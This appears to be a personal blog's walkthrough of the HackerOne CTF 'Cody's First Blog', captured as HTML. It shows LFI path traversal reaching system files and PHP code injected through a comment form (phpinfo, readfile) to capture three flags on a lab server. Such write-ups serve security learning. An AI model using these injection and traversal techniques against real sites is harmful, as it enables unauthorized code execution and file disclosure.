<!DOCTYPE html>
<html lang="en" prefix="og: https://ogp.me/ns#">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible"
      content="IE=edge">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0" />
<meta name="description"
      content="Adventures of Functional Mediocrity" />
<meta name="keywords"
      content="zola, theme, ink, hugo-ink" /> 

<title>John Tuyen | Cody&#x27;s First Blog</title>
<meta
  property="og:title"
  content="John Tuyen | Cody&#x27;s First Blog"
/>
<meta property="og:type" content="website" />
<meta property="og:url" content="https://johntuyen.com/posts/h1-codysfirstblog/" />
<meta property="og:description" content="Adventures of Functional Mediocrity" />
<meta property="og:image" content="" />
<meta property="og:image:url" content="" />
<meta property="og:image:secure_url" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Cody&#x27;s First Blog" />
<meta name="twitter:description" content="Adventures of Functional Mediocrity" />
<meta property="twitter:image" content="" />

<link rel="alternate"
          type="application/rss+xml"
          title="John Tuyen"
          href="https://johntuyen.com/atom.xml">
    <link rel="preconnect"
          href="https://fonts.googleapis.com">
    <link rel="preconnect"
          href="https://fonts.gstatic.com"
          crossorigin>
    <!-- <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">  -->
    <link href="https://fonts.googleapis.com/css2?family=Andada+Pro&display=swap&family=Playfair+Display"
          rel="stylesheet">
    <link rel="stylesheet"
          href="https://johntuyen.com/base.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.28.0/feather.min.js"
            integrity="sha512-7x3zila4t2qNycrtZ31HO0NnJr8kg2VI67YLoRSyi9hGhRN66FHYWr7Axa9Y1J9tGYHVBPqIjSE1ogHrJTz51g=="
            crossorigin="anonymous"></script>
</head>

<body>
    <header>
        <a class="site-name"
           href="/">
            <h1>John Tuyen</h1>
        </a>
        <div class="site-description">
            <p>Adventures of Functional Mediocrity</p>
        </div>
        <nav>
            <div class="links"> 
            <a 
                href="https://johntuyen.com/ ">About</a> 
            <a 
                href="https://johntuyen.com/posts/ ">Posts</a> 
            <a 
                href="https://johntuyen.com/gallery/ ">Gallery</a> 
            <a 
                href="https://johntuyen.com/tags/ ">Tags</a> 
            <a 
                href="https://johntuyen.com/search/ ">Search</a> 
            </div>
        </nav>
    </header>
    <article>
    

<section class="post">
  <div class="post-header">
    <div class="meta">
      <div class="date">
        <span class="day">31</span>
        <span class="rest">Dec 20</span>
      </div>
    </div>

    <div class="matter">
      <h1 class="title">Cody&#x27;s First Blog </h1>
    </div>
  </div>
    
  <article><h3 id="flag0">Flag0</h3>
<ol>
<li>
<p>&quot;Cody's First Blog&quot;</p>
<p>Inspecting the source reveals a URL that leads to an admin page:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;!--&lt;a href=&quot;?page=admin.auth.inc&quot;&gt;Admin login&lt;/a&gt;--&gt;
</span></code></pre>
<p>Navigation to URL:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://34.74.105.127/1512748f68/?page=admin.auth.inc
</span></code></pre>
<p>After poking around the page, I noticed there might be a potential for LFI. This enumeration process can at least can give us recon on what is running on the backend.</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>Notice: Undefined variable: title in /app/index.php on line 30
</span><span>
</span><span>Warning: include(../../../../etc/hosts.php): failed to open stream: No such file or directory in /app/index.php on line 21
</span><span>
</span><span>Warning: include(): Failed opening &#39;../../../../etc/hosts.php&#39; for inclusion (include_path=&#39;.:/usr/share/php:/usr/share/pear&#39;) in /app/index.php on line 21
</span></code></pre>
<p>Took note for files that had permission denied.</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>Notice: Undefined variable: title in /app/index.php on line 30
</span><span>
</span><span>Warning: include(/var/log/apache2/access_log.php): failed to open stream: Permission denied in /app/index.php on line 21
</span><span>
</span><span>Warning: include(): Failed opening &#39;/var/log/apache2/access_log.php&#39; for inclusion (include_path=&#39;.:/usr/share/php:/usr/share/pear&#39;) in /app/index.php on line 21
</span></code></pre>
<p><img src="/assets/images/h1/h1-codysfirstblog-1.png" alt="burp-intruder" /></p>
<p>Going back to the enumeration process again, I figured that if there is a text box and it's running PHP on the backend, testing for injection of PHP code would be the logical next step:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;?php phpinfo(); ?&gt;
</span></code></pre>
<p><img src="/assets/images/h1/h1-codysfirstblog-2.png" alt="flag0" /></p>
<p>Voila, flag0 has been captured.</p>
</li>
</ol>
<h3 id="flag1">Flag1</h3>
<ol>
<li>
<p>Circling back to the first flag, I've found the admin page but haven't discovered any vulnerabilities yet. The admin page has a login form and a text box. The text box can be used to submit comments waiting for approval. I'm guessing this means that there must be an approval page somewhere to be found. During my enumeration of possible hidden files and directories, I've managed to guess the file <code>admin.inc</code> which leads to an admin page to approve comments. Flag1 has been captured.</p>
<p><img src="/assets/images/h1/h1-codysfirstblog-3.png" alt="admin-approval" /></p>
</li>
</ol>
<h3 id="flag2">Flag2</h3>
<ol>
<li>
<p>Circling back to the potential LFI vulnerability, I tried enumerating the files using nullbytes but no luck. I tried using SQL injection authentication bypass methods and no luck either. After reading the hints given, it does mention LFI is the likely vulnerability to be targeting for. In my first attempt in flag0, I've identified the possibilities of the files that can be read with denied permissions. What I didn't check for is, can I actually read the <code>index.php</code> file that is being hosted? I started to look for ways to read files using PHP injection.</p>
<p>I took notes while I was tinkering around the possibilties, I know I can read files in the local app directory:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://34.74.105.127/fea3c7d20a/?page=../app/admin.auth.inc
</span></code></pre>
<p>When loading the <code>index.php</code> file, I noticed that the page tries to append an additional <code>.php</code> extension. In order to load the page properly, the URL needs to be like this:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://34.74.105.127/fea3c7d20a/?page=../app/index
</span></code></pre>
<p>I can also use LFI to call upon itself to read files:</p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>http://34.74.105.127/fea3c7d20a/?page=http://localhost/index
</span></code></pre>
<p>Armed with these three findings, I can combine the finding that was used in flag1 and inject PHP code to read <code>index.php</code> file. This will cause the server to execute and render the source code for <code>index.php</code></p>
<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;?php readfile(&#39;index.php&#39;)?&gt;
</span></code></pre>
<p>Approve the comment and trigger the LFI again. Third and final flag has been captured.</p>
<p><img src="/assets/images/h1/h1-codysfirstblog-4.png" alt="flag2" /></p>
</li>
</ol>
</article>

  
    
  
  <ul class="tags">
    
      <li><a href='https://johntuyen.com/tags/hackerone'>hackerone</a></li>
    
  </ul>
  
  
    
</section>
</article>
    <footer>
        <div class="social">
            <ul> 
                 
                <li>
                    <a href="https://github.com/jtuyen"
                       title="Github" rel="me"><i data-feather="github"></i></a>
                </li>
                 
                 
                <li>
                    <a href="https://twitter.com/jtuyen"
                       title="Twitter"
                       rel="me"><i data-feather="twitter"></i></a>
                </li>
                
                
                
                <li>
                    <a href="https://johntuyen.com/atom.xml"
                       title="John Tuyen"><i data-feather="rss"></i></a>
                </li>
            </ul>
        </div>
        <p> Â© John Tuyen 2024

        
        <br>Powered by <a target="_blank" href="https://getzola.org/">Zola</a>. Theme: <a target="_blank" href="https://github.com/jimmyff/zola-inky">Inky</a>.
        </p>
    </footer>
    <script>
        feather.replace();
    </script> 
    </body>
</html>